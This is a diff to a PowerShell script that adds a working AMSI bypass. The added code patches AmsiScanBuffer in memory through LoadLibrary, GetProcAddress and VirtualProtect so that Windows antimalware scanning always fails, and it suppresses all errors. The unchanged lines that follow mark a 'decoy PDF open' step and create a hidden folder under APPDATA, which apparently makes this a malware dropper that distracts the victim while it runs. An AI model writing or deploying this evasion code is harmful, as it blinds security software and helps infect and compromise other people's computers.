@@ -1,5 +1,21 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
+# === ROBUST AMSI BYPASS (AmsiScanBuffer Patch) ===
+try {
+    $Win32 = Add-Type -MemberDefinition @"
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@ -Name "Win32" -Namespace "Win32Functions" -PassThru
+
+    $ptr = $Win32::LoadLibrary("amsi.dll")
+    $addr = $Win32::GetProcAddress($ptr, "AmsiScanBuffer")
+    $oldProtect = 0
+    $Win32::VirtualProtect($addr, [UIntPtr]::new(6), 0x40, [ref]$oldProtect)
+    # Patch bytes: mov eax, 0x80070057; ret (forces AMSI to return E_INVALIDARG)
+    [System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, $addr, 6)
+} catch {}
+
 # === QUICK DECOY PDF OPEN (IMMEDIATE) ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
